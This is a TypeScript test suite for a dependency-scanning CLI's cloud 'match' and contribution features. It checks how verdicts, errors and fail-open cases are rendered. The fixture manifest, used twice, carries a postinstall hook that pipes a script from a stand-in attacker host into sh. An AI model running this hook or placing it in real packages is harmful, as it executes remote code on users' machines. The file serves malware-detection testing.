import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { runMatch, buildMatchPayload, renderMatchContext, runScanMatchAnnotation, shouldAttemptContribution } from './match';
import type { MatchRunResult, } from './match';
import { fetchMatch, validateMatchResult, saveSession } from './cloud_client';
import type { Session, MatchResult } from './cloud_client';

const MATCH_URL = 'https://cloud.example.com/api/intelligence/match';
const CONTRIBUTE_URL = 'https://cloud.example.com/api/intelligence/contribute';

function buildSession(token: string, overrides: Partial<Session> = {}): Session {
    return {
        token,
        user: 'octocat',
        subjectId: 'sub_123',
        plan: 'pro',
        planLabel: 'Pro',
        expiresAt: '2027-08-05T00:00:00.000Z',
        capabilities: {
            content_intel_lookup: true,
            remote_scan: true,
            oracle_integration: true,
            offline_sync: false,
            sbom: true,
            ai_review: false,
            contribute: true,
        },
        limits: { apiRequestsPerMonth: 10000, maxRepos: 25, retentionDays: 365 },
        fetchedAt: '2026-08-05T00:00:00.000Z',
        ...overrides,
    };
}

function makeTempDir(): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-match-'));
}

function outputText(result: MatchRunResult): string {
    return result.lines.map((l) => l.text).join('\n');
}

function writeManifest(dir: string, manifest: unknown = {
    name: 'evil-pkg',
    version: '1.0.0',
    scripts: { postinstall: 'curl -s https://evil.example.com/payload.sh | sh' },
}): string {
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(manifest, null, 2), 'utf8');
    return path.join(dir, 'package.json');
}

function matchBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
    return {
        state: 'MALICIOUS',
        decisiveState: 'MALICIOUS',
        contentId: `sha512:${'a'.repeat(128)}`,
        revoked: false,
        contentIdLevel: {
            found: true,
            verified: true,
            usable: true,
            verdict: 'MALICIOUS',
            confidence: 0.85,
            signature: 'a'.repeat(64),
            reason: null,
            historyLength: 3,
        },
        identityLevel: {
            packageIdentity: 'npm/evil-pkg@1.0.0',
            identityKnown: true,
            observations: 3,
            distinctContributors: 2,
            artifacts: 2,
            corroborated: true,
            corroboratedState: 'MALICIOUS',
            knownSignals: ['install_script', 'network'],
            maxRisk: 'critical',
            firstSeen: 1754035200000,
            hasCurrentArtifact: true,
        },
        match: {
            knownSignals: ['install_script', 'network'],
            newBehaviorSignals: [],
            sharedEvidence: {
                observations: 3,
                distinctContributors: 2,
                artifacts: 2,
                riskBand: 'critical',
                corroborated: true,
                decisiveState: 'MALICIOUS',
                firstSeen: 1754035200000,
            },
        },
        ...overrides,
    };
}

function matchResult(overrides: Record<string, unknown> = {}): MatchResult {
    return matchBody(overrides) as unknown as MatchResult;
}

function matchBodyNoMatch(): Record<string, unknown> {
    return matchBody({
        state: 'NO_MATCH',
        decisiveState: null,
        contentIdLevel: {
            found: false,
            verified: false,
            usable: false,
            verdict: null,
            confidence: null,
            signature: null,
            reason: null,
            historyLength: 0,
        },
        identityLevel: null,
        match: { knownSignals: [], newBehaviorSignals: [], sharedEvidence: null },
    });
}

function matchBodyMaliciousDifferentArtifact(): Record<string, unknown> {
    return matchBody({ identityLevel: { ...matchBody().identityLevel, hasCurrentArtifact: false } });
}

interface CloudRoute {
    match: RegExp;
    status: number;
    body: unknown;
    headers?: Record<string, string>;
}

function mockResponse(
    fetchMock: ReturnType<typeof vi.fn>,
    status: number,
    body: unknown,
    headers: Record<string, string> = {}
): void {
    mockCloud(fetchMock, [{ match: /api\/intelligence\/match$/, status, body, headers }]);
}

function mockCloud(fetchMock: ReturnType<typeof vi.fn>, routes: CloudRoute[]): void {
    fetchMock.mockImplementation((input: unknown) => {
        const url = String(input);
        const route = routes.find((r) => r.match.test(url)) ?? { status: 502, body: {} };
        const normalized: Record<string, string> = {};
        for (const [name, value] of Object.entries(route.headers ?? {})) {
            normalized[name.toLowerCase()] = value;
        }
        return Promise.resolve({
            ok: route.status >= 200 && route.status < 300,
            status: route.status,
            headers: {
                get: (name: string) => normalized[name.toLowerCase()] ?? null,
            },
            json: () => Promise.resolve(route.body),
        });
    });
}

function callsTo(fetchMock: ReturnType<typeof vi.fn>, endpoint: string): unknown[][] {
    return fetchMock.mock.calls.filter(([input]) => String(input).includes(endpoint));
}

describe('sentinel match command (runMatch)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('Given a MALICIOUS match on the SAME artifact when I run match then it renders the dependency as evidence with local evidence location', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(fetchMock, 200, matchBody());
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Known malicious dependency');
            expect(text).toContain('Package: npm/evil-pkg@1.0.0');
            expect(text).toContain('Local artifact: MATCHED');
            expect(text).toContain('State: MALICIOUS');
            expect(text).toContain('Corroborated: 2 contributors');
            expect(text).toContain('Signals: install_script, network');
            expect(text).toContain('Local evidence:');
            expect(text).toContain('package.json:');
            expect(fetchMock).toHaveBeenCalledTimes(1);
            const [url, init] = fetchMock.mock.calls[0];
            expect(String(url)).toBe(MATCH_URL);
            const headers = (init as { headers: Record<string, string> }).headers;
            expect(headers.Authorization).toBe('Bearer tok-1');
            const sentBody = JSON.parse((init as { body: string }).body);
            expect(sentBody.contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
            expect(sentBody.scannerVersion).toBe('sentinel-cli-4.0.0');
            expect(sentBody.identity).toEqual({ ecosystem: 'npm', package: 'evil-pkg', version: '1.0.0' });
            expect(sentBody.signals).toEqual(
                expect.arrayContaining(['install_script', 'network', 'download'])
            );
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a MALICIOUS match on a DIFFERENT artifact when I run match then it demands local verification instead of blind BLOCK (path B)', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                matchBody({
                    identityLevel: {
                        packageIdentity: 'npm/evil-pkg@1.0.0',
                        identityKnown: true,
                        observations: 3,
                        distinctContributors: 2,
                        artifacts: 1,
                        corroborated: true,
                        corroboratedState: 'MALICIOUS',
                        knownSignals: ['install_script'],
                        maxRisk: 'critical',
                        firstSeen: 1754035200000,
                        hasCurrentArtifact: false,
                    },
                    match: {
                        knownSignals: ['install_script'],
                        newBehaviorSignals: [],
                        sharedEvidence: {
                            observations: 3,
                            distinctContributors: 2,
                            artifacts: 1,
                            riskBand: 'critical',
                            corroborated: true,
                            decisiveState: 'MALICIOUS',
                            firstSeen: 1754035200000,
                        },
                    },
                })
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Known malicious dependency');
            expect(text).toContain('Local artifact: NOT SEEN');
            expect(text).toContain('Verify the current artifact locally before acting.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a completely unknown package (NO_MATCH) when I run match then it renders NOTHING — never implies SAFE (path C)', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                matchBody({
                    state: 'NO_MATCH',
                    decisiveState: null,
                    contentIdLevel: {
                        found: false,
                        verified: false,
                        usable: false,
                        verdict: null,
                        confidence: null,
                        signature: null,
                        reason: 'not_decisive',
                        historyLength: null,
                    },
                    identityLevel: null,
                    match: {
                        knownSignals: [],
                        newBehaviorSignals: [],
                        sharedEvidence: null,
                    },
                })
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).not.toContain('Known malicious dependency');
            expect(text).not.toContain('Previously observed');
            expect(text).not.toContain('SAFE');
            expect(text).toContain('Local analysis (primary source):');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a CORROBORATED match with new behavior signals when I run match then it renders context plus the new-behavior signal and does NOT block', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                matchBody({
                    state: 'CORROBORATED',
                    decisiveState: 'SUSPICIOUS',
                    identityLevel: {
                        packageIdentity: 'npm/evil-pkg@1.0.0',
                        identityKnown: true,
                        observations: 2,
                        distinctContributors: 2,
                        artifacts: 1,
                        corroborated: true,
                        corroboratedState: 'SUSPICIOUS',
                        knownSignals: ['install_script'],
                        maxRisk: 'high',
                        firstSeen: 1754035200000,
                        hasCurrentArtifact: true,
                    },
                    match: {
                        knownSignals: ['install_script'],
                        newBehaviorSignals: ['credential_access'],
                        sharedEvidence: {
                            observations: 2,
                            distinctContributors: 2,
                            artifacts: 1,
                            riskBand: 'high',
                            corroborated: true,
                            decisiveState: 'SUSPICIOUS',
                            firstSeen: 1754035200000,
                        },
                    },
                })
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Known dependency — corroborated behavior');
            expect(text).toContain('State: CORROBORATED (decisive: SUSPICIOUS)');
            expect(text).toContain('Corroborated: 2 contributors');
            expect(text).toContain('Known dependency — new behavior observed');
            expect(text).toContain('New signals: credential_access');
            expect(text).not.toContain('BLOCK');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a CORROBORATED match WITHOUT new behavior when I run match then it does NOT claim new behavior', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                matchBody({
                    state: 'CORROBORATED',
                    decisiveState: 'SUSPICIOUS',
                    match: {
                        knownSignals: ['install_script'],
                        newBehaviorSignals: [],
                        sharedEvidence: {
                            observations: 2,
                            distinctContributors: 2,
                            artifacts: 1,
                            riskBand: 'high',
                            corroborated: true,
                            decisiveState: 'SUSPICIOUS',
                            firstSeen: 1754035200000,
                        },
                    },
                })
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Known dependency — corroborated behavior');
            expect(text).not.toContain('new behavior observed');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an OBSERVED match when I run match then it renders a soft "previously observed" note with signals and insufficient corroboration', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                matchBody({
                    state: 'OBSERVED',
                    decisiveState: null,
                    contentIdLevel: {
                        found: false,
                        verified: false,
                        usable: false,
                        verdict: null,
                        confidence: null,
                        signature: null,
                        reason: null,
                        historyLength: null,
                    },
                    match: {
                        knownSignals: ['network', 'install_script'],
                        newBehaviorSignals: [],
                        sharedEvidence: {
                            observations: 1,
                            distinctContributors: 1,
                            artifacts: 1,
                            riskBand: 'medium',
                            corroborated: false,
                            decisiveState: null,
                            firstSeen: 1754035200000,
                        },
                    },
                })
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Previously observed by Sentinel');
            expect(text).toContain('- network');
            expect(text).toContain('- install_script');
            expect(text).toContain('Corroboration: insufficient');
            expect(text).not.toContain('BLOCK');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a KNOWN_SAFE decisiveState with usable hit when I run match then it renders the verified verdict as context', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                matchBody({
                    state: 'OBSERVED',
                    decisiveState: 'KNOWN_SAFE',
                    contentIdLevel: {
                        found: true,
                        verified: true,
                        usable: true,
                        verdict: 'KNOWN_SAFE',
                        confidence: 0.9,
                        signature: 'b'.repeat(64),
                        reason: null,
                        historyLength: 2,
                    },
                    match: {
                        knownSignals: [],
                        newBehaviorSignals: [],
                        sharedEvidence: null,
                    },
                })
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Previously observed by Sentinel');
            expect(text).toContain('Verdict: KNOWN_SAFE');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a REVOKED canonical when I run match then it flags the content as untrusted', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                matchBody({
                    revoked: true,
                    state: 'OBSERVED',
                    contentIdLevel: {
                        found: true,
                        verified: false,
                        usable: false,
                        verdict: null,
                        confidence: null,
                        signature: null,
                        reason: 'revoked',
                        historyLength: 1,
                    },
                    match: {
                        knownSignals: [],
                        newBehaviorSignals: [],
                        sharedEvidence: null,
                    },
                })
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Content revoked (depublished) — treat as untrusted.'
            );
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given no session when I run match then it exits 1 and does NOT call the server', async () => {
        const dir = makeTempDir();
        try {
            writeManifest(dir);
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain("No active session. Run 'sentinel login' first.");
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a plan without content_intel_lookup when I run match then it exits 1 with the plan message and does NOT call the server', async () => {
        const dir = makeTempDir();
        try {
            const session = buildSession('tok-1');
            saveSession(
                buildSession('tok-1', {
                    capabilities: { ...session.capabilities, content_intel_lookup: false },
                }),
                { sessionDir: dir }
            );
            writeManifest(dir);
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain(
                'Your plan does not include content intelligence lookup.'
            );
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given an invalid token when I run match then the session is cleared and it exits 1', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            expect(fs.existsSync(sessionPath)).toBe(true);
            mockResponse(fetchMock, 401, { error: 'Invalid or expired API token.' });
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain("Session expired. Run 'sentinel login'.");
            expect(fs.existsSync(sessionPath)).toBe(false);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a 429 from the Cloud when I run match then it exits 1 with quota + Retry-After and preserves the session', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                429,
                { error: 'Rate limit exceeded. Retry shortly.' },
                { 'Retry-After': '60' }
            );
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            const text = outputText(result);
            expect(text).toContain('Cloud limit reached (quota or rate).');
            expect(text).toContain('Retry in 60s.');
            expect(fs.existsSync(sessionPath)).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given the Cloud has content intelligence disabled (503) when I run match then it exits 1', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(fetchMock, 503, { error: 'Content-intel is disabled on this server.' });
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(1);
            expect(outputText(result)).toContain('Content intelligence is disabled on the Cloud.');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a Cloud network failure when I run match then it exits 0 with local analysis (fail-open) and preserves the session', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockCloud(fetchMock, [{ match: /api\/intelligence\/match$/, status: 502, body: {} }]);
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com' },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Cloud intelligence unavailable — continuing with local analysis.'
            );
            expect(fs.existsSync(sessionPath)).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a MALICIOUS match with --json when I run match then it prints the raw validated result', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(fetchMock, 200, matchBody());
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com', json: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const parsed = JSON.parse(outputText(result));
            expect(parsed.state).toBe('MALICIOUS');
            expect(parsed.decisiveState).toBe('MALICIOUS');
            expect(parsed.identityLevel.packageIdentity).toBe('npm/evil-pkg@1.0.0');
            expect(parsed.match.knownSignals).toEqual(['install_script', 'network']);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given --contribute and the Cloud ACCEPTS when I run match then it reports the Cloud decision verbatim', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockCloud(fetchMock, [
                { match: /api\/intelligence\/match$/, status: 200, body: matchBodyNoMatch() },
                {
                    match: /api\/intelligence\/contribute$/,
                    status: 200,
                    body: {
                        applied: true,
                        contentId: `sha512:${'a'.repeat(128)}`,
                        state: 'MALICIOUS',
                        previousState: 'UNKNOWN',
                        reason: null,
                        scannerVersion: 'sentinel-cli-4.0.0',
                        verified: false,
                    },
                },
            ]);
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com', contribute: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Contribution accepted by Cloud');
            const contributeCalls = callsTo(fetchMock, '/api/intelligence/contribute');
            expect(contributeCalls).toHaveLength(1);
            const [, init] = contributeCalls[0];
            const sentBody = JSON.parse((init as { body: string }).body);
            expect(sentBody.contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
            expect(sentBody.state).toBe('MALICIOUS');
            expect(sentBody.identity).toEqual({ ecosystem: 'npm', package: 'evil-pkg', version: '1.0.0' });
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given --contribute and the Cloud returns duplicate when I run match then it reports duplicate as the CLOUD decision, never claiming novelty', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockCloud(fetchMock, [
                { match: /api\/intelligence\/match$/, status: 200, body: matchBodyMaliciousDifferentArtifact() },
                {
                    match: /api\/intelligence\/contribute$/,
                    status: 200,
                    body: {
                        applied: false,
                        contentId: `sha512:${'a'.repeat(128)}`,
                        state: 'MALICIOUS',
                        previousState: 'MALICIOUS',
                        reason: 'duplicate',
                        scannerVersion: 'sentinel-cli-4.0.0',
                        verified: false,
                    },
                },
            ]);
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com', contribute: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Contribution not applied by Cloud (reason: duplicate)');
            expect(text).not.toMatch(/new evidence/i);
            expect(text).not.toMatch(/is definitively new/i);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given a plan without the contribute capability when I run match --contribute then it never calls the contribute endpoint', async () => {
        const dir = makeTempDir();
        try {
            const session = buildSession('tok-1');
            saveSession(
                buildSession('tok-1', {
                    capabilities: { ...session.capabilities, contribute: false },
                }),
                { sessionDir: dir }
            );
            writeManifest(dir);
            mockResponse(fetchMock, 200, matchBody());
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com', contribute: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            expect(fetchMock).toHaveBeenCalledTimes(1);
            const [url] = fetchMock.mock.calls[0];
            expect(String(url)).toBe(MATCH_URL);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});

describe('sentinel match N3.3C contribution matrix (CLI never decides novelty)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    const EVIL = {
        name: 'evil-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'curl -s https://evil.example.com/payload.sh | sh' },
    };
    const BENIGN = { name: 'ok-pkg', version: '1.0.0', scripts: { postinstall: 'echo hi' } };
    const ACCEPTED = {
        applied: true,
        contentId: `sha512:${'a'.repeat(128)}`,
        state: 'MALICIOUS',
        previousState: 'UNKNOWN',
        reason: null,
        scannerVersion: 'sentinel-cli-4.0.0',
        verified: false,
    };

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    function cloudWithContribute(body: Record<string, unknown>): void {
        mockCloud(fetchMock, [
            { match: /api\/intelligence\/match$/, status: 200, body },
            { match: /api\/intelligence\/contribute$/, status: 200, body: ACCEPTED },
        ]);
    }

    interface Row {
        name: string;
        body: Record<string, unknown>;
        manifest: unknown;
        expectContribute: boolean;
        expectedText: string;
    }

    const rows: Row[] = [
        {
            name: 'NO_MATCH + evil evidence',
            body: matchBodyNoMatch(),
            manifest: EVIL,
            expectContribute: true,
            expectedText: 'Contribution accepted by Cloud',
        },
        {
            name: 'NO_MATCH + no local evidence',
            body: matchBodyNoMatch(),
            manifest: BENIGN,
            expectContribute: false,
            expectedText: 'Contribution skipped: no local evidence produced.',
        },
        {
            name: 'OBSERVED + evil evidence',
            body: matchBody({ state: 'OBSERVED', decisiveState: null }),
            manifest: EVIL,
            expectContribute: true,
            expectedText: 'Contribution accepted by Cloud',
        },
        {
            name: 'OBSERVED + no local evidence',
            body: matchBody({ state: 'OBSERVED', decisiveState: null }),
            manifest: BENIGN,
            expectContribute: false,
            expectedText: 'Contribution skipped: no local evidence produced.',
        },
        {
            name: 'CORROBORATED + evil evidence',
            body: matchBody({ state: 'CORROBORATED', decisiveState: null }),
            manifest: EVIL,
            expectContribute: true,
            expectedText: 'Contribution accepted by Cloud',
        },
        {
            name: 'CORROBORATED + no local evidence',
            body: matchBody({ state: 'CORROBORATED', decisiveState: null }),
            manifest: BENIGN,
            expectContribute: false,
            expectedText: 'Contribution skipped: no local evidence produced.',
        },
        {
            name: 'MALICIOUS same artifact + evil evidence (never re-contributes known malware)',
            body: matchBody(),
            manifest: EVIL,
            expectContribute: false,
            expectedText: 'Contribution skipped: artifact already known to Sentinel (MALICIOUS, same artifact).',
        },
        {
            name: 'MALICIOUS different artifact + evil evidence',
            body: matchBodyMaliciousDifferentArtifact(),
            manifest: EVIL,
            expectContribute: true,
            expectedText: 'Contribution accepted by Cloud',
        },
        {
            name: 'REVOKED + evil evidence',
            body: matchBody({ revoked: true }),
            manifest: EVIL,
            expectContribute: true,
            expectedText: 'Contribution accepted by Cloud',
        },
    ];

    for (const row of rows) {
        it(`Given ${row.name} when I run match --contribute then contribute is ${
            row.expectContribute ? 'attempted' : 'never called'
        }`, async () => {
            const dir = makeTempDir();
            try {
                saveSession(buildSession('tok-1'), { sessionDir: dir });
                writeManifest(dir, row.manifest);
                cloudWithContribute(row.body);
                const result = await runMatch(
                    { targetPath: dir, api: 'https://cloud.example.com', contribute: true },
                    { sessionDir: dir }
                );
                expect(result.exitCode).toBe(0);
                expect(outputText(result)).toContain(row.expectedText);
                const contributeCalls = callsTo(fetchMock, '/api/intelligence/contribute');
                if (row.expectContribute) {
                    expect(contributeCalls).toHaveLength(1);
                } else {
                    expect(contributeCalls).toHaveLength(0);
                }
            } finally {
                fs.rmSync(dir, { recursive: true, force: true });
            }
        });
    }

    it('Given the Cloud is unreachable with --contribute then the local scan still fails open, contribute is never called and it never claims SAFE', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir, EVIL);
            mockResponse(fetchMock, 502, {});
            const result = await runMatch(
                { targetPath: dir, api: 'https://cloud.example.com', contribute: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const text = outputText(result);
            expect(text).toContain('Cloud intelligence unavailable — continuing with local analysis.');
            expect(text).not.toMatch(/SAFE/);
            expect(callsTo(fetchMock, '/api/intelligence/contribute')).toHaveLength(0);
            expect(callsTo(fetchMock, '/api/intelligence/match')).toHaveLength(1);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('shouldAttemptContribution gates only on known MALICIOUS same-artifact (not revoked)', () => {
        expect(shouldAttemptContribution(matchResult())).toBe(false);
        expect(shouldAttemptContribution(matchResult({ revoked: true }))).toBe(true);
        expect(shouldAttemptContribution(matchResult(matchBodyMaliciousDifferentArtifact()))).toBe(true);
        expect(shouldAttemptContribution(matchResult(matchBodyNoMatch()))).toBe(true);
        expect(shouldAttemptContribution(matchResult({ state: 'OBSERVED', decisiveState: null }))).toBe(true);
        expect(shouldAttemptContribution(matchResult({ state: 'CORROBORATED', decisiveState: null }))).toBe(true);
    });
});

describe('sentinel match renderMatchContext (pure presentation)', () => {
    it('Given NO_MATCH when I render then it returns an empty block (never implies SAFE)', () => {
        const lines = renderMatchContext(matchResult({
            state: 'NO_MATCH',
            decisiveState: null,
            contentIdLevel: { found: false, verified: false, usable: false, verdict: null, confidence: null, signature: null, reason: null, historyLength: null },
            identityLevel: null,
            match: { knownSignals: [], newBehaviorSignals: [], sharedEvidence: null },
        }));
        expect(lines).toEqual([]);
    });

    it('Given NO_MATCH but REVOKED when I render then it still surfaces the revoked warning', () => {
        const lines = renderMatchContext(matchResult({
            revoked: true,
            state: 'NO_MATCH',
            decisiveState: null,
            contentIdLevel: { found: true, verified: false, usable: false, verdict: null, confidence: null, signature: null, reason: 'revoked', historyLength: 1 },
            identityLevel: null,
            match: { knownSignals: [], newBehaviorSignals: [], sharedEvidence: null },
        }));
        expect(lines.join('\n')).toContain('Content revoked (depublished) — treat as untrusted.');
    });

    it('Given MALICIOUS on a different artifact when I render then it demands verification (never blind BLOCK)', () => {
        const lines = renderMatchContext(matchResult({
            identityLevel: {
                packageIdentity: 'npm/x@1.0.0',
                identityKnown: true,
                observations: 1,
                distinctContributors: 2,
                artifacts: 1,
                corroborated: true,
                corroboratedState: 'MALICIOUS',
                knownSignals: ['install_script'],
                maxRisk: 'critical',
                firstSeen: 1754035200000,
                hasCurrentArtifact: false,
            },
        }));
        const text = lines.join('\n');
        expect(text).toContain('Local artifact: NOT SEEN');
        expect(text).toContain('Verify the current artifact locally before acting.');
    });
});

describe('sentinel match buildMatchPayload', () => {
    it('builds a sha512 contentId, scanner version, signals and identity from the manifest + findings', () => {
        const manifest = JSON.stringify({ name: 'evil-pkg', version: '1.0.0' }, null, 2);
        const payload = buildMatchPayload(manifest, []);
        expect(payload.contentId).toMatch(/^sha512:[0-9a-f]{128}$/);
        expect(payload.scannerVersion).toBe('sentinel-cli-4.0.0');
        expect(payload.identity).toEqual({ ecosystem: 'npm', package: 'evil-pkg', version: '1.0.0' });
        expect(payload.maxAgeMs).toBeUndefined();
    });

    it('only forwards maxAgeMs when it is a positive finite number', () => {
        const manifest = '{"name":"x","version":"1.0.0"}';
        const withMax = buildMatchPayload(manifest, [], { maxAgeMs: 5000 });
        expect(withMax.maxAgeMs).toBe(5000);
        const zero = buildMatchPayload(manifest, [], { maxAgeMs: 0 });
        expect(zero.maxAgeMs).toBeUndefined();
        const negative = buildMatchPayload(manifest, [], { maxAgeMs: -1 });
        expect(negative.maxAgeMs).toBeUndefined();
    });
});

describe('sentinel match runScanMatchAnnotation (scan integration, fail-open)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('Given no package.json when I annotate then it returns an empty annotation (additive, no-op)', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            const result = await runScanMatchAnnotation(dir, [], { sessionDir: dir });
            expect(result).toEqual([]);
            expect(fetchMock).not.toHaveBeenCalled();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });

    it('Given no session when I annotate then it returns an empty annotation (fail-open)', async () => {
        const dir = makeTempDir();
        try {
            writeManifest(dir);
            const result = await runScanMatchAnnotation(dir, [], { sessionDir: dir });
            expect(result).toEqual([]);
            expect(fetchMock).not.toHaveBeenCalled();
